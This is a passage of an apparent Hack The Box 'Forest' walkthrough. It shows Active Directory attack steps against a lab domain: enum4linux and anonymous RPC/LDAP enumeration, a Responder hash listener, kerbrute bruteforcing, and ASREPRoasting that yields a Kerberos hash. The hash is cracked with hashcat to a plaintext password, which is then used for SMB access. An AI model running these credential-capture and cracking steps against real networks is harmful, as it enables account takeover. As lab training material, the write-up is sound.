+</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Exchange</span> <span class=n>Trusted</span> <span class=n>Subsystem</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x45f</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Managed</span> <span class=n>Availability</span> <span class=n>Servers</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x460</span><span class=p>]</span> 
+</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Exchange</span> <span class=n>Windows</span> <span class=n>Permissions</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x461</span><span class=p>]</span> 
+</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>ExchangeLegacyInterop</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x462</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=o>$</span><span class=n>D31000</span><span class=o>-</span><span class=n>NSEL5BRJ63V7</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x46d</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Service</span> <span class=n>Accounts</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x47c</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>Privileged</span> <span class=n>IT</span> <span class=n>Accounts</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x47d</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>group</span><span class=p>:[</span><span class=n>test</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x13ed</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span>  <span class=n>Getting</span> <span class=n>domain</span> <span class=n>group</span> <span class=n>memberships</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>Group</span><span class=p>:</span> <span class=s1>&#39;Domain Guests&#39;</span> <span class=p>(</span><span class=ne>RID</span><span class=p>:</span> <span class=mi>514</span><span class=p>)</span> <span class=n>has</span> <span class=n>member</span><span class=p>:</span> <span class=n>HTB</span>\<span class=n>Guest</span>
+</span></span><span class=line><span class=cl><span class=n>Group</span><span class=p>:</span> <span class=s1>&#39;Privileged IT Accounts&#39;</span> <span class=p>(</span><span class=ne>RID</span><span class=p>:</span> <span class=mi>1149</span><span class=p>)</span> <span class=n>has</span> <span class=n>member</span><span class=p>:</span> <span class=n>HTB</span>\<span class=n>Service</span> <span class=n>Accounts</span>
+</span></span><span class=line><span class=cl><span class=n>Group</span><span class=p>:</span> <span class=s1>&#39;Public Folder Management&#39;</span> <span class=p>(</span><span class=ne>RID</span><span class=p>:</span> <span class=mi>1107</span><span class=p>)</span> <span class=n>has</span> <span class=n>member</span><span class=p>:</span> <span class=n>Could</span> <span class=ow>not</span> <span class=n>initialise</span> <span class=n>pipe</span> <span class=n>samr</span><span class=o>.</span> <span class=n>Error</span> <span class=n>was</span> <span class=n>NT_STATUS_CONNECTION_DISCONNECTED</span>
+</span></span><span class=line><span class=cl><span class=n>Group</span><span class=p>:</span> <span class=s1>&#39;Domain Controllers&#39;</span> <span class=p>(</span><span class=ne>RID</span><span class=p>:</span> <span class=mi>516</span><span class=p>)</span> <span class=n>has</span> <span class=n>member</span><span class=p>:</span> <span class=n>HTB</span>\<span class=n>FOREST</span><span class=o>$</span>
+</span></span><span class=line><span class=cl><span class=n>Group</span><span class=p>:</span> <span class=s1>&#39;Read-only Domain Controllers&#39;</span> <span class=p>(</span><span class=ne>RID</span><span class=p>:</span> <span class=mi>521</span><span class=p>)</span> <span class=n>has</span> <span class=n>member</span><span class=p>:</span> <span class=n>Could</span> <span class=ow>not</span> <span class=n>connect</span> <span class=n>to</span> <span class=n>server</span> <span class=mf>10.129</span><span class=o>.</span><span class=mf>191.98</span>
+</span></span><span class=line><span class=cl><span class=n>Group</span><span class=p>:</span> <span class=s1>&#39;Group Policy Creator Owners&#39;</span> <span class=p>(</span><span class=ne>RID</span><span class=p>:</span> <span class=mi>520</span><span class=p>)</span> <span class=n>has</span> <span class=n>member</span><span class=p>:</span> <span class=n>HTB</span>\<span class=n>Administrator</span>                                                                                                      <span class=mi>19</span><span class=p>:</span><span class=mi>26</span><span class=p>:</span><span class=mi>56</span> <span class=p>[</span><span class=mi>1</span><span class=o>/</span><span class=mi>531</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>Group</span><span class=p>:</span> <span class=s1>&#39;Domain Users&#39;</span> <span class=p>(</span><span class=ne>RID</span><span class=p>:</span> <span class=mi>513</span><span class=p>)</span> <span class=n>has</span> <span class=n>member</span><span class=p>:</span> <span class=n>HTB</span>\<span class=n>Administrator</span>
+</span></span><span class=line><span class=cl><span class=n>Group</span><span class=p>:</span> <span class=s1>&#39;Domain Users&#39;</span> <span class=p>(</span><span class=ne>RID</span><span class=p>:</span> <span class=mi>513</span><span class=p>)</span> <span class=n>has</span> <span class=n>member</span><span class=p>:</span> <span class=n>HTB</span>\<span class=n>DefaultAccount</span>
+</span></span><span class=line><span class=cl><span class=n>Group</span><span class=p>:</span> <span class=s1>&#39;Domain Users&#39;</span> <span class=p>(</span><span class=ne>RID</span><span class=p>:</span> <span class=mi>513</span><span class=p>)</span> <span class=n>has</span> <span class=n>member</span><span class=p>:</span> <span class=n>HTB</span>\<span class=n>krbtgt</span>
+</span></span><span class=line><span class=cl><span class=n>Group</span><span class=p>:</span> <span class=s1>&#39;Domain Users&#39;</span> <span class=p>(</span><span class=ne>RID</span><span class=p>:</span> <span class=mi>513</span><span class=p>)</span> <span class=n>has</span> <span class=n>member</span><span class=p>:</span> <span class=n>HTB</span>\<span class=o>$</span><span class=mi>331000</span><span class=o>-</span><span class=n>VK4ADACQNUCA</span>
+</span></span><span class=line><span class=cl><span class=n>Group</span><span class=p>:</span> <span class=s1>&#39;Domain Users&#39;</span> <span class=p>(</span><span class=ne>RID</span><span class=p>:</span> <span class=mi>513</span><span class=p>)</span> <span class=n>has</span> <span class=n>member</span><span class=p>:</span> <span class=n>HTB</span>\<span class=n>SM_2c8eef0a09b545acb</span>
+</span></span><span class=line><span class=cl><span class=n>Group</span><span class=p>:</span> <span class=s1>&#39;Domain Users&#39;</span> <span class=p>(</span><span class=ne>RID</span><span class=p>:</span> <span class=mi>513</span><span class=p>)</span> <span class=n>has</span> <span class=n>member</span><span class=p>:</span> <span class=n>HTB</span>\<span class=n>SM_ca8c2ed5bdab4dc9b</span>
+</span></span><span class=line><span class=cl><span class=n>Group</span><span class=p>:</span> <span class=s1>&#39;Domain Users&#39;</span> <span class=p>(</span><span class=ne>RID</span><span class=p>:</span> <span class=mi>513</span><span class=p>)</span> <span class=n>has</span> <span class=n>member</span><span class=p>:</span> <span class=n>HTB</span>\<span class=n>SM_75a538d3025e4db9a</span>
+</span></span><span class=line><span class=cl><span class=n>Group</span><span class=p>:</span> <span class=s1>&#39;Domain Users&#39;</span> <span class=p>(</span><span class=ne>RID</span><span class=p>:</span> <span class=mi>513</span><span class=p>)</span> <span class=n>has</span> <span class=n>member</span><span class=p>:</span> <span class=n>HTB</span>\<span class=n>SM_681f53d4942840e18</span>
+</span></span><span class=line><span class=cl><span class=n>Group</span><span class=p>:</span> <span class=s1>&#39;Domain Users&#39;</span> <span class=p>(</span><span class=ne>RID</span><span class=p>:</span> <span class=mi>513</span><span class=p>)</span> <span class=n>has</span> <span class=n>member</span><span class=p>:</span> <span class=n>HTB</span>\<span class=n>SM_1b41c9286325456bb</span>
+</span></span><span class=line><span class=cl><span class=n>Group</span><span class=p>:</span> <span class=s1>&#39;Domain Users&#39;</span> <span class=p>(</span><span class=ne>RID</span><span class=p>:</span> <span class=mi>513</span><span class=p>)</span> <span class=n>has</span> <span class=n>member</span><span class=p>:</span> <span class=n>HTB</span>\<span class=n>SM_9b69f1b9d2cc45549</span>
+</span></span><span class=line><span class=cl><span class=n>Group</span><span class=p>:</span> <span class=s1>&#39;Domain Users&#39;</span> <span class=p>(</span><span class=ne>RID</span><span class=p>:</span> <span class=mi>513</span><span class=p>)</span> <span class=n>has</span> <span class=n>member</span><span class=p>:</span> <span class=n>HTB</span>\<span class=n>SM_7c96b981967141ebb</span>
+</span></span><span class=line><span class=cl><span class=n>Group</span><span class=p>:</span> <span class=s1>&#39;Domain Users&#39;</span> <span class=p>(</span><span class=ne>RID</span><span class=p>:</span> <span class=mi>513</span><span class=p>)</span> <span class=n>has</span> <span class=n>member</span><span class=p>:</span> <span class=n>HTB</span>\<span class=n>SM_c75ee099d0a64c91b</span>
+</span></span><span class=line><span class=cl><span class=n>Group</span><span class=p>:</span> <span class=s1>&#39;Domain Users&#39;</span> <span class=p>(</span><span class=ne>RID</span><span class=p>:</span> <span class=mi>513</span><span class=p>)</span> <span class=n>has</span> <span class=n>member</span><span class=p>:</span> <span class=n>HTB</span>\<span class=n>SM_1ffab36a2f5f479cb</span>
+</span></span><span class=line><span class=cl><span class=n>Group</span><span class=p>:</span> <span class=s1>&#39;Domain Users&#39;</span> <span class=p>(</span><span class=ne>RID</span><span class=p>:</span> <span class=mi>513</span><span class=p>)</span> <span class=n>has</span> <span class=n>member</span><span class=p>:</span> <span class=n>HTB</span>\<span class=n>HealthMailboxc3d7722</span>
+</span></span><span class=line><span class=cl><span class=n>Group</span><span class=p>:</span> <span class=s1>&#39;Domain Users&#39;</span> <span class=p>(</span><span class=ne>RID</span><span class=p>:</span> <span class=mi>513</span><span class=p>)</span> <span class=n>has</span> <span class=n>member</span><span class=p>:</span> <span class=n>HTB</span>\<span class=n>HealthMailboxfc9daad</span>
+</span></span><span class=line><span class=cl><span class=n>Group</span><span class=p>:</span> <span class=s1>&#39;Domain Users&#39;</span> <span class=p>(</span><span class=ne>RID</span><span class=p>:</span> <span class=mi>513</span><span class=p>)</span> <span class=n>has</span> <span class=n>member</span><span class=p>:</span> <span class=n>HTB</span>\<span class=n>HealthMailboxc0a90c9</span>
+</span></span><span class=line><span class=cl><span class=n>Group</span><span class=p>:</span> <span class=s1>&#39;Domain Users&#39;</span> <span class=p>(</span><span class=ne>RID</span><span class=p>:</span> <span class=mi>513</span><span class=p>)</span> <span class=n>has</span> <span class=n>member</span><span class=p>:</span> <span class=n>HTB</span>\<span class=n>HealthMailbox670628e</span>
+</span></span><span class=line><span class=cl><span class=n>Group</span><span class=p>:</span> <span class=s1>&#39;Domain Users&#39;</span> <span class=p>(</span><span class=ne>RID</span><span class=p>:</span> <span class=mi>513</span><span class=p>)</span> <span class=n>has</span> <span class=n>member</span><span class=p>:</span> <span class=n>HTB</span>\<span class=n>HealthMailbox968e74d</span>
+</span></span><span class=line><span class=cl><span class=n>Group</span><span class=p>:</span> <span class=s1>&#39;Domain Users&#39;</span> <span class=p>(</span><span class=ne>RID</span><span class=p>:</span> <span class=mi>513</span><span class=p>)</span> <span class=n>has</span> <span class=n>member</span><span class=p>:</span> <span class=n>HTB</span>\<span class=n>HealthMailbox6ded678</span>
+</span></span><span class=line><span class=cl><span class=n>Group</span><span class=p>:</span> <span class=s1>&#39;Domain Users&#39;</span> <span class=p>(</span><span class=ne>RID</span><span class=p>:</span> <span class=mi>513</span><span class=p>)</span> <span class=n>has</span> <span class=n>member</span><span class=p>:</span> <span class=n>HTB</span>\<span class=n>HealthMailbox83d6781</span>
+</span></span><span class=line><span class=cl><span class=n>Group</span><span class=p>:</span> <span class=s1>&#39;Domain Users&#39;</span> <span class=p>(</span><span class=ne>RID</span><span class=p>:</span> <span class=mi>513</span><span class=p>)</span> <span class=n>has</span> <span class=n>member</span><span class=p>:</span> <span class=n>HTB</span>\<span class=n>HealthMailboxfd87238</span>
+</span></span><span class=line><span class=cl><span class=n>Group</span><span class=p>:</span> <span class=s1>&#39;Domain Users&#39;</span> <span class=p>(</span><span class=ne>RID</span><span class=p>:</span> <span class=mi>513</span><span class=p>)</span> <span class=n>has</span> <span class=n>member</span><span class=p>:</span> <span class=n>HTB</span>\<span class=n>HealthMailboxb01ac64</span>
+</span></span><span class=line><span class=cl><span class=n>Group</span><span class=p>:</span> <span class=s1>&#39;Domain Users&#39;</span> <span class=p>(</span><span class=ne>RID</span><span class=p>:</span> <span class=mi>513</span><span class=p>)</span> <span class=n>has</span> <span class=n>member</span><span class=p>:</span> <span class=n>HTB</span>\<span class=n>HealthMailbox7108a4e</span>
+</span></span><span class=line><span class=cl><span class=n>Group</span><span class=p>:</span> <span class=s1>&#39;Domain Users&#39;</span> <span class=p>(</span><span class=ne>RID</span><span class=p>:</span> <span class=mi>513</span><span class=p>)</span> <span class=n>has</span> <span class=n>member</span><span class=p>:</span> <span class=n>HTB</span>\<span class=n>HealthMailbox0659cc1</span>
+</span></span><span class=line><span class=cl><span class=n>Group</span><span class=p>:</span> <span class=s1>&#39;Domain Users&#39;</span> <span class=p>(</span><span class=ne>RID</span><span class=p>:</span> <span class=mi>513</span><span class=p>)</span> <span class=n>has</span> <span class=n>member</span><span class=p>:</span> <span class=n>HTB</span>\<span class=n>sebastien</span>
+</span></span><span class=line><span class=cl><span class=n>Group</span><span class=p>:</span> <span class=s1>&#39;Domain Users&#39;</span> <span class=p>(</span><span class=ne>RID</span><span class=p>:</span> <span class=mi>513</span><span class=p>)</span> <span class=n>has</span> <span class=n>member</span><span class=p>:</span> <span class=n>HTB</span>\<span class=n>lucinda</span>
+</span></span><span class=line><span class=cl><span class=n>Group</span><span class=p>:</span> <span class=s1>&#39;Domain Users&#39;</span> <span class=p>(</span><span class=ne>RID</span><span class=p>:</span> <span class=mi>513</span><span class=p>)</span> <span class=n>has</span> <span class=n>member</span><span class=p>:</span> <span class=n>HTB</span>\<span class=n>svc</span><span class=o>-</span><span class=n>alfresco</span>
+</span></span><span class=line><span class=cl><span class=n>Group</span><span class=p>:</span> <span class=s1>&#39;Domain Users&#39;</span> <span class=p>(</span><span class=ne>RID</span><span class=p>:</span> <span class=mi>513</span><span class=p>)</span> <span class=n>has</span> <span class=n>member</span><span class=p>:</span> <span class=n>HTB</span>\<span class=n>andy</span>
+</span></span><span class=line><span class=cl><span class=n>Group</span><span class=p>:</span> <span class=s1>&#39;Domain Users&#39;</span> <span class=p>(</span><span class=ne>RID</span><span class=p>:</span> <span class=mi>513</span><span class=p>)</span> <span class=n>has</span> <span class=n>member</span><span class=p>:</span> <span class=n>HTB</span>\<span class=n>mark</span>
+</span></span><span class=line><span class=cl><span class=n>Group</span><span class=p>:</span> <span class=s1>&#39;Domain Users&#39;</span> <span class=p>(</span><span class=ne>RID</span><span class=p>:</span> <span class=mi>513</span><span class=p>)</span> <span class=n>has</span> <span class=n>member</span><span class=p>:</span> <span class=n>HTB</span>\<span class=n>santi</span>
+</span></span><span class=line><span class=cl><span class=n>Group</span><span class=p>:</span> <span class=s1>&#39;Exchange Servers&#39;</span> <span class=p>(</span><span class=ne>RID</span><span class=p>:</span> <span class=mi>1118</span><span class=p>)</span> <span class=n>has</span> <span class=n>member</span><span class=p>:</span> <span class=n>HTB</span>\<span class=n>EXCH01</span><span class=o>$</span>
+</span></span><span class=line><span class=cl><span class=n>Group</span><span class=p>:</span> <span class=s1>&#39;Exchange Servers&#39;</span> <span class=p>(</span><span class=ne>RID</span><span class=p>:</span> <span class=mi>1118</span><span class=p>)</span> <span class=n>has</span> <span class=n>member</span><span class=p>:</span> <span class=n>HTB</span>\<span class=o>$</span><span class=n>D31000</span><span class=o>-</span><span class=n>NSEL5BRJ63V7</span>
+</span></span><span class=line><span class=cl><span class=n>Group</span><span class=p>:</span> <span class=s1>&#39;DnsUpdateProxy&#39;</span> <span class=p>(</span><span class=ne>RID</span><span class=p>:</span> <span class=mi>1102</span><span class=p>)</span> <span class=n>has</span> <span class=n>member</span><span class=p>:</span> <span class=n>Could</span> <span class=ow>not</span> <span class=n>initialise</span> <span class=n>pipe</span> <span class=n>samr</span><span class=o>.</span> <span class=n>Error</span> <span class=n>was</span> <span class=n>NT_STATUS_INVALID_NETWORK_RESPONSE</span>
+</span></span><span class=line><span class=cl><span class=n>Group</span><span class=p>:</span> <span class=s1>&#39;Exchange Trusted Subsystem&#39;</span> <span class=p>(</span><span class=ne>RID</span><span class=p>:</span> <span class=mi>1119</span><span class=p>)</span> <span class=n>has</span> <span class=n>member</span><span class=p>:</span> <span class=n>HTB</span>\<span class=n>EXCH01</span><span class=o>$</span>
+</span></span><span class=line><span class=cl><span class=n>Group</span><span class=p>:</span> <span class=s1>&#39;Managed Availability Servers&#39;</span> <span class=p>(</span><span class=ne>RID</span><span class=p>:</span> <span class=mi>1120</span><span class=p>)</span> <span class=n>has</span> <span class=n>member</span><span class=p>:</span> <span class=n>HTB</span>\<span class=n>EXCH01</span><span class=o>$</span>
+</span></span><span class=line><span class=cl><span class=n>Group</span><span class=p>:</span> <span class=s1>&#39;Managed Availability Servers&#39;</span> <span class=p>(</span><span class=ne>RID</span><span class=p>:</span> <span class=mi>1120</span><span class=p>)</span> <span class=n>has</span> <span class=n>member</span><span class=p>:</span> <span class=n>HTB</span>\<span class=n>Exchange</span> <span class=n>Servers</span>
+</span></span><span class=line><span class=cl><span class=n>Group</span><span class=p>:</span> <span class=s1>&#39;Service Accounts&#39;</span> <span class=p>(</span><span class=ne>RID</span><span class=p>:</span> <span class=mi>1148</span><span class=p>)</span> <span class=n>has</span> <span class=n>member</span><span class=p>:</span> <span class=n>HTB</span>\<span class=n>svc</span><span class=o>-</span><span class=n>alfresco</span>
+</span></span><span class=line><span class=cl><span class=n>Group</span><span class=p>:</span> <span class=s1>&#39;Schema Admins&#39;</span> <span class=p>(</span><span class=ne>RID</span><span class=p>:</span> <span class=mi>518</span><span class=p>)</span> <span class=n>has</span> <span class=n>member</span><span class=p>:</span> <span class=n>lsaquery</span> <span class=n>failed</span><span class=p>:</span> <span class=n>NT_STATUS_IO_TIMEOUT</span>
+</span></span><span class=line><span class=cl><span class=n>Group</span><span class=p>:</span> <span class=s1>&#39;$D31000-NSEL5BRJ63V7&#39;</span> <span class=p>(</span><span class=ne>RID</span><span class=p>:</span> <span class=mi>1133</span><span class=p>)</span> <span class=n>has</span> <span class=n>member</span><span class=p>:</span> <span class=n>HTB</span>\<span class=n>EXCH01</span><span class=o>$</span>
+</span></span><span class=line><span class=cl><span class=n>Group</span><span class=p>:</span> <span class=s1>&#39;Exchange Windows Permissions&#39;</span> <span class=p>(</span><span class=ne>RID</span><span class=p>:</span> <span class=mi>1121</span><span class=p>)</span> <span class=n>has</span> <span class=n>member</span><span class=p>:</span> <span class=n>HTB</span>\<span class=n>Exchange</span> <span class=n>Trusted</span> <span class=n>Subsystem</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl> <span class=o>==================</span><span class=p>(</span> <span class=n>Users</span> <span class=n>on</span> <span class=mf>10.129</span><span class=o>.</span><span class=mf>191.98</span> <span class=n>via</span> <span class=ne>RID</span> <span class=n>cycling</span> <span class=p>(</span><span class=n>RIDS</span><span class=p>:</span> <span class=mi>500</span><span class=o>-</span><span class=mi>550</span><span class=p>,</span><span class=mi>1000</span><span class=o>-</span><span class=mi>1050</span><span class=p>)</span> <span class=p>)</span><span class=o>==================</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>E</span><span class=p>]</span> <span class=n>Couldn</span><span class=s1>&#39;t get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl> <span class=o>===============================</span><span class=p>(</span> <span class=n>Getting</span> <span class=n>printer</span> <span class=n>info</span> <span class=k>for</span> <span class=mf>10.129</span><span class=o>.</span><span class=mf>191.98</span> <span class=p>)</span><span class=o>===============================</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>do_cmd</span><span class=p>:</span> <span class=n>Could</span> <span class=ow>not</span> <span class=n>initialise</span> <span class=n>spoolss</span><span class=o>.</span> <span class=n>Error</span> <span class=n>was</span> <span class=n>NT_STATUS_ACCESS_DENIED</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>enum4linux</span> <span class=n>complete</span> <span class=n>on</span> <span class=n>Fri</span> <span class=n>Jan</span> <span class=mi>30</span> <span class=mi>19</span><span class=p>:</span><span class=mi>26</span><span class=p>:</span><span class=mi>56</span> <span class=mi>2026</span>
+</span></span></code></pre></td></tr></table></div></div><ol start=2><li>I also set up a listener to capture NetNTLM hashes.</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>sudo responder -I tun0 -dvw 
+</span></span></code></pre></td></tr></table></div></div><ul><li>Nothing captured.</li></ul><h2 id=rpc>RPC</h2><ol><li>From the output of <code>enum4linux</code>, I can see that the RPC allows anonymous logins.</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>rpcclient -N -U <span class=s2>&#34;&#34;</span> 10.129.191.98
+</span></span></code></pre></td></tr></table></div></div><ol start=2><li>We can list users with <code>enumdomusers</code> etc, but it has been covered by <code>enum4linux</code>. Might check back later.</li></ol><h2 id=ldap>LDAP</h2><ol><li>Nice, LDAP allows anonymous logins too.</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-SH data-lang=SH><span class=line><span class=cl>ldapsearch -b <span class=s2>&#34;&#34;</span> -s base <span class=se>\*</span> + -H ldap://10.129.191.98 -x -LLL <span class=p>|</span> tee ldapsearch_1.txt
+</span></span></code></pre></td></tr></table></div></div><ol start=2><li>Let&rsquo;s get all domain users</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-SH data-lang=SH><span class=line><span class=cl>ldapsearch -H ldap://10.129.191.98 -x -b <span class=s2>&#34;DC=htb,DC=local&#34;</span> -s sub <span class=s2>&#34;(&amp;(objectclass=user))&#34;</span> <span class=p>|</span> tee ldapsearch_users.txt 
+</span></span></code></pre></td></tr></table></div></div><h2 id=kerbrute>Kerbrute</h2><ol><li>I tried to bruteforce the password of one user</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-SH data-lang=SH><span class=line><span class=cl>./kerbrute bruteuser --dc 10.129.191.98 /usr/share/wordlists/rockyou.txt -d htb.local sebastien -v 
+</span></span></code></pre></td></tr></table></div></div><ul><li>Does not work</li><li>Note from the future: Check the password policy before bruteforcing to prevent account lockout.</li></ul><ol start=2><li>I also performed ASREPRoasting</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>impacket-GetNPUsers -usersfile /home/kali/hackthebox/Forest/availableUsers -dc-ip 10.129.191.98 htb.local/
+</span></span></code></pre></td></tr></table></div></div><ul><li>Remember to map <code>&lt;ip> htb.local</code> in the <code>/etc/hosts</code>
+Output:
+Nothing</li></ul><ol start=3><li>Here is a very interesting thing:</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>rpcclient</span> <span class=o>$&gt;</span> <span class=n>enumdomusers</span>
+</span></span><span class=line><span class=cl><span class=o>&lt;</span><span class=n>SNIP</span><span class=o>&gt;</span>
+</span></span><span class=line><span class=cl><span class=n>user</span><span class=p>:[</span><span class=n>sebastien</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x479</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>user</span><span class=p>:[</span><span class=n>lucinda</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x47a</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>user</span><span class=p>:[</span><span class=n>svc</span><span class=o>-</span><span class=n>alfresco</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x47b</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>user</span><span class=p>:[</span><span class=n>andy</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x47e</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>user</span><span class=p>:[</span><span class=n>mark</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x47f</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>user</span><span class=p>:[</span><span class=n>santi</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x480</span><span class=p>]</span>
+</span></span></code></pre></td></tr></table></div></div><ul><li>The output of RPC shows <code>svc-alfresco</code>, but not LDAP
+Once I put <code>svc-alfresco</code> in, we got a hit</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;SNIP&gt;
+</span></span><span class=line><span class=cl>[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+</span></span><span class=line><span class=cl>[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+</span></span><span class=line><span class=cl>[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+</span></span><span class=line><span class=cl>$krb5asrep$23$svc-alfresco@HTB.LOCAL:70ea7500342e6995f6e610d86d88bb70$72bb393b6820e1744a1f625ee26a4835ae4b551d26f9ff7fc932569c9bf0d7663f37e8dc3a8092c467bfc4328b8f94c8424b4638d19835ea234048cf912a00c5052ebd10b3e3a2c5bdbbfbcd3a894fb721c5d230e1a7d3faa95a9c1f46f32a2ae2dc8eecce9d46ffe61d8c8e9ad3b213e2bbe2b23375aa3bc4292720fa20978051293a04e8e5c8810cb6588c6fad65b45cc9b237d6a07ed344e38a587ccdeb4fa0f1400b9b234e698d489c6fcc2e2ab0e12b613b4c33f4c9621b8f12a6d1a30c42b24c11a8870699f7498757a0af3a00de0faa5225600f551af44934bd1fe91bd8702c95b2a1
+</span></span></code></pre></td></tr></table></div></div><ul><li>Note from the future: Don&rsquo;t trust LDAP only to list usernames. Check with RPC and SMB.</li></ul><ol start=4><li>To crack the hash, use <code>hashcat</code> mode 18200</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>hashcat -m <span class=m>18200</span> alfresco-asrep.hash /usr/share/wordlists/rockyou.txt 
+</span></span></code></pre></td></tr></table></div></div><p>Output:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$krb5asrep$23$svc-alfresco@HTB.LOCAL:70&lt;SNIP&gt;bd8702c95b2a1:s3rvice
+</span></span></code></pre></td></tr></table></div></div><h2 id=smb-as-svc-alfresco>SMB as svc-alfresco</h2><ol><li>Let&rsquo;s try to access SMB as <code>svc-alfresco</code></li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>netexec smb 10.129.191.98 -u svc-alfresco -p s3rvice --shares
+</span></span></code></pre></td></tr></table></div></div><p>Output:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
